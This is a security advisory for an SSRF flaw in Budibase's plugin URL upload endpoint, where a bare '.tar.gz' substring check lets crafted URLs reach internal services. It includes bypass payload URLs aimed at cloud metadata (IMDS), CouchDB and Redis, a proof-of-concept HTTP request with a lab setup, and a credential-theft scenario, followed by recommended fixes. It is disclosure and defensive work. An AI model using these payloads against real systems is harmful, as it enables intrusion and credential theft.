# [H] Budibase vulnerable to SSRF via trivial `.tar.gz` substring bypass in Plugin URL upload (`/api/plugin`)

## Summary
Severity: High
Advisory: GHSA-xh5j-727m-w6gg
CVE: CVE-2026-45061
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-xh5j-727m-w6gg
Type: github-advisory

## Affected
- npm: `budibase` — affected >=0 <3.35.10

## Details
## 1. Summary

| Field | Value |
|-------|-------|
| **Title** | SSRF via trivial `.tar.gz` substring bypass in Plugin URL upload |
| **Product** | Budibase (Self-Hosted) |
| **Version** | ≤ 3.34.11 (latest stable as of 2026-03-30) |
| **Component** | `packages/server/src/api/controllers/plugin/url.ts` |
| **Vulnerability Type** | CWE-918: Server-Side Request Forgery (SSRF), CWE-184: Incomplete List of Disallowed Inputs |
| **Severity** | High (chained) / Medium (standalone) |
| **CVSS 3.1 Score (chained)** | 7.7 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| **CVSS 3.1 Score (standalone)** | 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Attack Vector** | Network |
| **Privileges Required** | Low (Global Builder role) |
| **User Interaction** | None |
| **Affected Deployments** | All Budibase instances with plugin loading enabled (default) |

---

## 2. Description

The Plugin URL upload endpoint (`POST /api/plugin`) validates the submitted URL with a single substring check: `url.includes(".tar.gz")`. Any URL containing `.tar.gz` anywhere in the string — in the path, query string, or fragment — passes this check. The URL then proceeds directly to `fetchWithBlacklist()` with no further validation of host, scheme, or path.

Standalone, this vulnerability is blocked by Budibase's default SSRF blacklist, which covers private IP ranges. But the URL validation layer itself is broken regardless, and it directly enables SSRF in two realistic situations: (1) when chained with the `BLACKLIST_IPS` bypass ([001]), where the blacklist is empty; and (2) when the plugin server follows HTTP redirects from an external URL to an internal target (the default `node-fetch` behavior with `redirect: 'follow'`).

The developer team's own test suite (`objectStore.spec.ts:393`) tests that `downloadTarballDirect` passes through `fetchWithBlacklist` — confirming they're aware of the SSRF risk on this path. The `.tar.gz` substring check as the only URL-level guard was never intended to be the security boundary, but in practice it is.

---

## 3. Root Cause Analysis

### 3.1 Trivial substring-based URL validation

**File**: `packages/server/src/api/controllers/plugin/url.ts`

```typescript
// Lines 7-19
export async function urlUpload(url: string, name = "", headers = {}) {
  if (!url.includes(".tar.gz")) {
    // ← ONLY validation: any URL with ".tar.gz" anywhere passes
    throw new Error("Plugin must be compressed into a gzipped tarball.")
  }

  const path = await downloadUnzipTarball(url, name, headers)
  // ↑ url is passed directly — no host allowlist, no scheme check, no path normalization
  try {
    return await getPluginMetadata(path)
  } catch (err) {
    deleteFolderFileSystem(path)
    throw err
  }
}
```

**Problem**: `url.includes(".tar.gz")` checks for a substring anywhere in the full URL string. It does not validate hostname, scheme, or that `.tar.gz` appears as an actual file extension at the end of the path.

### 3.2 Bypass examples

| Attack URL | `includes(".tar.gz")` | Actual request target |
|------------|----------------------|----------------------|
| `http://169.254.169.254/.tar.gz` | ✅ passes | AWS IMDS |
| `http://127.0.0.1:4005/_session.tar.gz` | ✅ passes | CouchDB |
| `http://10.0.0.1:6379/.tar.gz` | ✅ passes | Redis |
| `http://attacker.com/file.tar.gz?x=http://internal/` | ✅ passes | Redirect to internal |
| `http://internal-host/.tar.gz#fragment` | ✅ passes | Internal service |

### 3.3 Developer awareness of SSRF risk on this path

**File**: `packages/backend-core/src/objectStore/tests/objectStore.spec.ts`

```typescript
// Line 393
it("uses fetchWithBlacklist in downloadTarballDirect", async () => {
  downloadTarballDirect("http://169.254.169.254/metadata/v1/", "tmp")
  // ← team explicitly tests that IMDS is blocked via blacklist
})
```

The team knows this code path can reach IMDS. They rely on `fetchWithBlacklist` as the defense — but never tested the `.tar.gz` substring bypass that trivially routes around it at the URL validation layer.

### 3.4 Authorization model

| Operation | Endpoint | Required Permission |
|-----------|----------|---------------------|
| Plugin URL upload | `POST /api/plugin` | Global Builder |

**Key insight**: The plugin endpoint is behind `globalBuilderRoutes`, which requires Global Builder permission. This is a low-privilege role routinely granted to developers on self-hosted instances.

---

## 4. Impact Analysis

### 4.1 Confidentiality — High (chained) / Low (standalone)

When chained with [001] (`BLACKLIST_IPS` bypass):
- **AWS/GCP/Azure IMDS** (`169.254.169.254`) — IAM credentials, service account tokens
- **CouchDB** (`127.0.0.1:4005`) — application databases, user records
- **Redis** (`127.0.0.1:6379`) — session tokens
- **Internal network services** (`172.16.0.0/12`, `10.0.0.0/8`)

Standalone (with default blacklist active):
- **Open redirect chains** — if the plugin server follows redirects from external URLs to internal IPs, the blacklist check on the original URL does not protect against the redirected destination. This depends on `node-fetch` redirect behavior and whether `fetchWithBlacklist` re-checks the redirected URL.

### 4.2 Integrity — None (GET-only path)

The plugin URL upload uses GET-only semantics via `fetchWithBlacklist`. No write operations to internal services via this path.

### 4.3 Availability — None

No service disruption.

### 4.4 Scope Change (chained)

Same as [001]: crosses application → infrastructure boundary when combined with the blacklist bypass.

---

## 5. Proof of Concept

> **Verification status**: Code-level confirmed. End-to-end Docker test pending.
> PoC files are ready: `poc/004_plugin_url_ssrf/poc_004_plugin_url_ssrf.py` + `docker-compose.yml`

### 5.1 Environment Setup

```bash
# poc/004_plugin_url_ssrf/docker-compose.yml
services:
  budibase:
    image: budibase/budibase:latest
    environment:
      SELF_HOSTED: "1"
      BLACKLIST_IPS: ""          # ← enables chained SSRF (001)
      JWT_SECRET: "poc_jwt_secret"
      BB_ADMIN_USER_EMAIL: "poc@budibase.com"
      BB_ADMIN_USER_PASSWORD: "pocPassword123!"
    ports: ["10000:10000"]

  victim:
    image: python:3.11-alpine
    command: python -m http.server 8888
```

```bash
cd poc/004_plugin_url_ssrf
docker-compose up -d
python3 poc_004_plugin_url_ssrf.py --target http://localhost:10000
```

### 5.2 Step 1 — Bypass the `.tar.gz` check with a crafted URL

```http
POST /api/plugin HTTP/1.1
Host: localhost:10000
Cookie: budibase:auth=<builder-session-cookie>
Content-Type: application/json

{
  "source": "URL",
  "url": "http://victim:8888/.tar.gz",
  "name": "poc-test"
}
```

The `url.includes(".tar.gz")` check passes because `.tar.gz` appears in the path. The URL `http://victim:8888/.tar.gz` is not a valid tarball — but the string check doesn't know that.

### 5.3 Step 2 — Expected response (SSRF confirmed)

**With blacklist active (default config):**
```json
{ "message": "Failed to import plugin: URL is blocked or could not be resolved safely." }
```

**With `BLACKLIST_IPS=""` (chained with 001):**
```json
{ "message": "Failed to import plugin: incorrect header check" }
```

The `"incorrect header check"` error (zlib decompressor receiving HTTP response headers) proves the request reached `victim:8888`. The `.tar.gz` substring check was bypassed, and the HTTP fetch completed.

### 5.4 Additional bypass payloads tested (code-level only)

| URL | Check bypass | Intended target |
|-----|-------------|-----------------|
| `http://169.254.169.254/.tar.gz` | ✅ | AWS IMDS |
| `http://127.0.0.1:4005/_session.tar.gz` | ✅ | CouchDB |
| `http://127.0.0.1:6379/.tar.gz` | ✅ | Redis |
| `http://attacker.com/real.tar.gz` (redirects to `http://10.0.0.1/`) | ✅ | Internal via redirect |

---

## 6. Attack Scenarios

### Scenario A — Chained with [001]: AWS IMDS credential theft

```
1. Self-hosted deployment has BLACKLIST_IPS set to any value (see report 001)
2. Builder user sends:
   POST /api/plugin { "source": "URL", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name.tar.gz" }
3. Budibase fetches IMDS endpoint → receives IAM credentials JSON
4. zlib decompressor fails on non-gzip content → error response
5. Depending on logging config, credential material may appear in logs or error details
```

### Scenario B — Standalone: Open redirect SSRF (default config)

```
1. Attacker controls external server: GET /plugin.tar.gz → 302 → http://192.168.1.1/admin
2. Builder user submits: POST /api/plugin { "source": "URL", "url": "http://attacker.com/plugin.tar.gz" }
3. node-fetch follows redirect (default: redirect: 'follow')
4. If fetchWithBlacklist only checks the original URL (not the redirected URL), internal IP is reached
5. Requires verification of redirect handling in fetchWithBlacklist
```

### Scenario C — CouchDB data access (chained)

```
1. BLACKLIST_IPS="" enables internal access
2. URL: http://127.0.0.1:4005/_all_dbs.tar.gz
3. CouchDB responds with JSON list of databases
4. zlib error confirms HTTP request reached CouchDB
```

---

## 7. Affected Code Paths

```
POST /api/plugin  (Global Builder auth)
    │
    ▼
packages/server/src/api/controllers/plugin/index.ts
    │  source === "URL" → urlUpload(url, name, headers)
    ▼
packages/server/src/api/controllers/plugin/url.ts:8
    │  if (!url.includes(".tar.gz")) throw   ← ONLY check — trivially bypassed
    │  → "http://169.254.169.254/.tar.gz" passes
    ▼
packages/server/src/utilities/fileSystem/plugins.ts
    │  downloadUnzipTarball(url, name, headers)
    ▼
packages/backend-core/src/objectStore/objectStore.ts:703
    │  downloadTarballDirect(url, path, headers)
    ▼
packages/backend-core/src/objectStore/utils/outboundFetch.ts
    │  fetchWithBlacklist(url, options)
    │  isBlacklisted(hostname)
    │
    ├─ [default config] → BlockList has 9 private ranges → 169.254.x BLOCKED ✓
    │
    └─ [BLACKLIST_IPS set, chained with 001] → empty BlockList → 169.254.x REACHABLE ✗
```

---

## 8. Recommended Fixes

### Fix 1 (High): Replace substring check with URL parsing and extension validation

```typescript
// packages/server/src/api/controllers/plugin/url.ts

import { URL } from "url"

export async function urlUpload(url: string, name = "", headers = {}) {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    throw new Error("Invalid plugin URL.")
  }

  // Only allow https:// scheme
  if (parsed.protocol !== "https:") {
    throw new Error("Plugin URL must use HTTPS.")
  }

  // Require the path to end with .tar.gz (not just contain it anywhere)
  if (!parsed.pathname.endsWith(".tar.gz")) {
    throw new Error("Plugin must be compressed into a gzipped tarball (.tar.gz).")
  }

  const path = await downloadUnzipTarball(url, name, headers)
  // ...
}
```

### Fix 2 (High): Re-check blacklist after redirect in `fetchWithBlacklist`

```typescript
// packages/backend-core/src/objectStore/utils/outboundFetch.ts

// Current: only checks the original URL before fetch
// Fix: also intercept redirects and re-check each redirect target

const response = await nodeFetch(url, {
  ...options,
  redirect: "manual",  // don't auto-follow
})

if (response.status >= 300 && response.status < 400) {
  const redirectUrl = response.headers.get("location")
  if (redirectUrl) {
    const redirectHost = new URL(redirectUrl).hostname
    if (await isBlacklisted(redirectHost)) {
      throw new Error("URL is blocked or could not be resolved safely.")
    }
    // recursively fetch (with depth limit)
  }
}
```

### Fix 3 (Medium): Add hostname allowlist option for plugin sources

Provide a `PLUGIN_ALLOWED_HOSTS` variable that restricts plugin URL downloads to explicitly approved domains, rather than relying solely on a blocklist.

---

## 9. References

- **CWE-918**: Server-Side Request Forgery (SSRF) — https://cwe.mitre.org/data/definitions/918.html
- **CWE-184**: Incomplete List of Disallowed Inputs — https://cwe.mitre.org/data/definitions/184.html
- **OWASP SSRF Prevention Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **Related finding**: [001] `BLACKLIST_IPS` bypass — `report/raw/001_ssrf_blacklist_bypass.md`
- **Developer SSRF awareness test**: `packages/backend-core/src/objectStore/tests/objectStore.spec.ts:393`

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-xh5j-727m-w6gg
- https://nvd.nist.gov/vuln/detail/CVE-2026-45061
- https://github.com/Budibase/budibase
